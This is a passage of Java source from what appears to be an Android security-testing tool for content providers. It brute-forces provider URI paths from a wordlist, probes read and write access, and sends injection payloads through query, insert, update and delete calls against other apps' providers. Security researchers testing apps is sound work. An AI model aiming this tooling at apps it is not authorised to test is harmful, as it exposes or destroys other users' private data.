            // After testing a third of the words, check the error rate
            int wordNumThird = words.size() / 3;
            double readErrRate;
            double writeErrRate;
            // Try at least X first before triggering optimisation
            if (wordNumThird >= 300) {
                if (bruteRead && readCount > wordNumThird && (readErrRate = getErrorRate(readCount, readErrCount)) > DISCOVER_BRUTE_ERR_RATE_LIMIT) {
                    logWarn(String.format(Locale.getDefault(), "%.2f%% error rate after %d read queries, stopping read brute-force for base: %s", readErrRate * 100.0, wordNumThird, base));
                    bruteRead = false;
                } else if (bruteWrite && writeCount > wordNumThird && (writeErrRate = getErrorRate(writeCount, writeErrCount)) > DISCOVER_BRUTE_ERR_RATE_LIMIT) {
                    logWarn(String.format(Locale.getDefault(), "%.2f%% error rate after %d write queries, stopping write brute-force for base: %s", writeErrRate * 100.0, wordNumThird, base));
                    bruteWrite = false;
                }
            }
            // Assume fields will be consistent between single/multi record suffix
            String[] uriFields = null;
            String[] pathSuffix;
            if (!word.contains("/")) {
                // Try querying for item (suffix with id) first, then word + / (to bypass weak path regex patterns)
                pathSuffix = new String[]{word + "/1", word + "/", word};
            } else {
                // Word contains a forward slash, so maybe a path already, dont mess with it
                pathSuffix = new String[]{word};
            }
            for (String suffix : pathSuffix) {
                // Normalise double slashes to single slashes and append the suffix
                Uri.Builder uriBuilder = base.buildUpon().appendEncodedPath(suffix);
                String appendSuffixPath = "/";
                if (uriBuilder.build().getPath() != null) {
                    appendSuffixPath = uriBuilder.build().getPath().replace("//", "/");
                }
                Uri uri = uriBuilder.encodedPath(appendSuffixPath).build();
                if (bruteRead && hasProviderOrPathPermission(pInfo, true, uri)) {
                    Cursor dbCur = null;
                    try {
                        readCount++;
                        // Read with query() - low risk, non destructive
                        dbCur = query(uri, null, null, null, null);
                        if (dbCur != null) {
                            uriFields = dbCur.getColumnNames();
                            String uriAuthFieldHash = getUriAuthorityBruteForceHash(uri, uriFields, true);
                            if (!uriFieldBruteHashes.contains(uriAuthFieldHash)) {
                                logInf("Got cursor with query(" + uri + ")");
                                paths.put(uri, uriFields);
                            }
                            uriFieldBruteHashes.add(uriAuthFieldHash);
                        }
                    } catch (RuntimeException re) {
                        // Catch SecurityException and UnsupportedOperationException
                        readErrCount++;
                    } finally {
                        if (dbCur != null) {
                            dbCur.close();
                        }
                    }
                }
                if (bruteWrite && hasProviderOrPathPermission(pInfo, false, uri)) {
                    ContentValues qVals = new ContentValues();
                    if (uriFields == null || uriFields.length == 0) {
                        //TODO: deal with WITHOUT ROWID?
                        // No fields found, use dummy key/values
                        qVals = InjectionPayload.getDummyValues();
                    } else {
                        // Use field names from previous query
                        for (String key : uriFields) {
                            qVals.put(key, "123");
                        }
                    }
                    try {
                        writeCount++;
                        //TODO: deal with WITHOUT ROWID?
                        // Write with update() - low risk, non destructive as using false where
                        int ret = update(uri, qVals, "1=2", null);
                        if (ret >= 0) {
                            String uriAuthFieldHash = getUriAuthorityBruteForceHash(uri, uriFields, false);
                            if (!uriFieldBruteHashes.contains(uriAuthFieldHash)) {
                                logInf("Got return value (" + ret + ") with update(" + uri + ")");
                                paths.put(uri, uriFields);
                            }
                            uriFieldBruteHashes.add(uriAuthFieldHash);
                        }
                    } catch (RuntimeException re) {
                        // Catch SecurityException and UnsupportedOperationException
                        writeErrCount++;
                    }
                }
            }
        }
        return paths;
    }

    private String getUriAuthorityBruteForceHash(Uri uri, String[] uriFields, boolean isQuery) {
        /*
         * Make the hash out of:
         * - authority
         * - base path segment
         * - fields from cursor
         * - is id uri
         * - uri ends in slash
         */
        String auth = uri.getAuthority() != null ? uri.getAuthority() : "null";
        //String basePath = uri.getPathSegments().size() > 0 ? uri.getPathSegments().get(0) : "nopath";
        boolean isId = uri.getPath() != null && uri.getPath().matches(".*/\\d+$");
        boolean endsInSlash = uri.getPath() != null && uri.getPath().endsWith("/");
        return Util.getHashStr(auth, uriFields, isId, endsInSlash, isQuery);
    }

    private Set<String> mangleResource(ComponentInfo inf, int type) {
        Set<String> strings = new HashSet<>();
        String resName;
        switch (type) {
            case RES_ACTIVITY:
                ActivityInfo aInf = (ActivityInfo) inf;
                resName = aInf.name.replace("Activity", "");
                break;
            case RES_PROVIDER:
                ProviderInfo pInf = (ProviderInfo) inf;
                resName = pInf.name.replace("Provider", "");
                break;
            case RES_RECEIVER:
                ActivityInfo rInf = (ActivityInfo) inf;
                resName = rInf.name.replace("Receiver", "");
                break;
            case RES_SERVICE:
                ServiceInfo sInf = (ServiceInfo) inf;
                resName = sInf.name.replace("Service", "");
                break;
                default:
                    logWarn("Unknown resource type: " + type);
                    return null;
        }
        // Strip first two package segments
        String[] nameSplit = resName.split("\\.");
        if (nameSplit.length > 2) {
            nameSplit = Arrays.copyOfRange(nameSplit, 2, nameSplit.length);
        }
        for (String word : nameSplit) {
            // Whole word
            Util.addToList(strings, word);
            // Get separate words from upper camel cased single words
            String wordConv = CaseFormat.UPPER_CAMEL.to(CaseFormat.LOWER_UNDERSCORE, word);
            if (wordConv.contains("_")) {
                String[] wordConvSplit = wordConv.split("_");
                for (String splitWord : wordConvSplit) {
                    Util.addToList(strings, splitWord);
                }
            }
        }
        return strings;
    }

    private ContentResolver getResolver() {
        return context.getContentResolver();
    }

    public Cursor queryWithPayload(CPVector vector, String payloadString) {
        if (!vector.isValid() || vector.isUnknownType()) {
            logWarn("Invalid vector");
            return null;
        }

        CPVector plVector = vector.getWithPayloadString(payloadString);
        Cursor cur = null;
        long start = System.currentTimeMillis();
        try {
            cur = query(plVector.getUri(), plVector.getProjection(), plVector.getWhere(), plVector.getSelectionArgs(), plVector.getSortOrder());
        } catch (Exception e) {
            logErr("Exception running query(): " + e.getMessage() + ". Payload: " + payloadString);
        }
        long end = System.currentTimeMillis();
        logInf("query() to Uri: " + vector.getUri() + " (" + (end - start) + "ms)");
        if (cur != null) {
            logInf("Cursor returned " + cur.getCount() + " row(s)");
            ArrayList<String[]> rows = getRows(cur);
            printRows(rows);
        } else {
            logErr("Cursor was null");
        }
        return cur;
    }

    private Cursor query(Uri uri, String[] projection, String selection, String[] selectionArgs, String sortOrder) {
        if (queryListener != null) {
            queryListener.onQuery(uri, projection, selection, selectionArgs, sortOrder);
        }
        return getResolver().query(uri, projection, selection, selectionArgs, sortOrder);
    }

    public Uri insertWithPayload(CPVector vector, String payloadString) {
        if (!vector.isValid() || vector.isUnknownType() || vector.getValues() == null) {
            logWarn("Invalid vector");
            return null;
        }

        CPVector plVector = vector.getWithPayloadString(payloadString);
        long start = System.currentTimeMillis();
        Uri uri = null;
        try {
            uri = insert(plVector.getUri(), plVector.getValues());
        } catch (Exception e) {
            logErr("Exception running insert(): " + e.getMessage() + ". Payload: " + payloadString);
        }
        long end = System.currentTimeMillis();
        logInf("insert() to Uri: " + vector.getUri() + " (" + (end - start) + "ms)");
        if (uri != null) {
            logInf("Uri returned: " + uri);
        } else {
            logErr("Uri was null");
        }
        return uri;
    }

    private Uri insert(Uri uri, ContentValues values) {
        if (queryListener != null) {
            queryListener.onInsert(uri, values);
        }
        return getResolver().insert(uri, values);
    }

    public int updateWithPayload(CPVector vector, String payloadString) {
        if (!vector.isValid() || vector.isUnknownType() || vector.getValues() == null) {
            logWarn("Invalid vector");
            return -1;
        }

        CPVector plVector = vector.getWithPayloadString(payloadString);
        long start = System.currentTimeMillis();
        int ret = -1;
        try {
            ret = update(plVector.getUri(), plVector.getValues(), plVector.getWhere(), plVector.getSelectionArgs());
        } catch (Exception e) {
            logErr("Exception running update(): " + e.getMessage() + ". Payload: " + payloadString);
        }
        long end = System.currentTimeMillis();
        logInf("update() to Uri: " + vector.getUri() + " (" + (end - start) + "ms)");
        if (ret != -1) {
            logInf("Return value was: " + ret);
        } else {
            logErr("Return value was null (-1)");
        }
        return ret;
    }

    private int update(Uri uri, ContentValues values, String where, String[] selectionArgs) {
        if (queryListener != null) {
            queryListener.onUpdate(uri, values, where, selectionArgs);
        }
        return getResolver().update(uri, values != null ? values : CPVector.getBasicContentValuesForUpdateVector(), where, selectionArgs);
    }

    public int deleteWithPayload(CPVector vector, String payloadString) {
        if (!vector.isValid() || vector.isUnknownType()) {
            logWarn("Invalid vector");
            return -1;
        }

        CPVector plVector = vector.getWithPayloadString(payloadString);
        long start = System.currentTimeMillis();
        int ret = -1;
        try {
            ret = delete(plVector.getUri(), plVector.getWhere(), plVector.getSelectionArgs());
        } catch (Exception e) {
            logErr("Exception running delete(): " + e.getMessage() + ". Payload: " + payloadString);
        }
        long end = System.currentTimeMillis();
        logInf("delete() to Uri: " + vector.getUri() + " (" + (end - start) + "ms)");
        if (ret != -1) {
            logInf("Return value was: " + ret);
        } else {
            logErr("Return value was null (-1)");
        }
        return ret;
    }

    private int delete(Uri uri, String where, String[] selectionArgs) {
        if (queryListener != null) {
            queryListener.onDelete(uri, where, selectionArgs);
        }
        return getResolver().delete(uri, where, selectionArgs);
    }

    private String getTag() {
        return TAG + " [" + System.currentTimeMillis() + "]";
    }

    private void logInf(String msg) {
        Log.i(getTag(), msg);
        dispatchLogInf(msg);
    }

    private void logWarn(String msg) {
        Log.w(getTag(), msg);
        dispatchLogWarn(msg);
    }

    private void logErr(String msg) {
        Log.e(getTag(), msg);
        dispatchLogErr(msg);
    }

    private void dispatchLogInf(String msg) {
        if (logListeners != null) {
            msg = String.format("I/%s: %s", getTag(), msg);
            for (CPMapLogListener logListener : logListeners) {
                if (logListener != null) {
                    logListener.onLogInf(msg);
                }
            }
        }
    }

    private void dispatchLogWarn(String msg) {
        if (logListeners != null) {
            msg = String.format("W/%s: %s", getTag(), msg);
            for (CPMapLogListener logListener : logListeners) {
                if (logListener != null) {
                    logListener.onLogWarn(msg);
                }
            }
        }
    }

    private void dispatchLogErr(String msg) {
        if (logListeners != null) {
            msg = String.format("E/%s: %s", getTag(), msg);
            for (CPMapLogListener logListener : logListeners) {
                if (logListener != null) {
                    logListener.onLogErr(msg);
                }
            }
        }
    }

    private boolean hasPermission(String perm) {
        // If perm is null, assume we have permission
        if (perm == null) {
            return true;
        }
        boolean hasPerm = Util.hasPermission(context, perm);
        if (hasPerm && (getArrayListOption("permissions") == null || getArrayListOption("permissions").contains(perm))) {
            return true;
        }
        return false;
    }

    public interface CPMapLogListener {
        void onLogInf(String msg);
        void onLogWarn(String msg);
        void onLogErr(String msg);
    }

    public interface CPMapQueryListener {
        void onQuery(Uri uri, String[] projection, String where, String[] selectionArgs, String sort);
        void onInsert(Uri uri, ContentValues vals);
        void onUpdate(Uri uri, ContentValues vals, String where, String[] selectionArgs);
        void onDelete(Uri uri, String where, String[] selectionArgs);
    }

    public interface CPMapDumpListener {
        void onVectorPayloadFound(CPVector vector, Payload payload);
    }

}
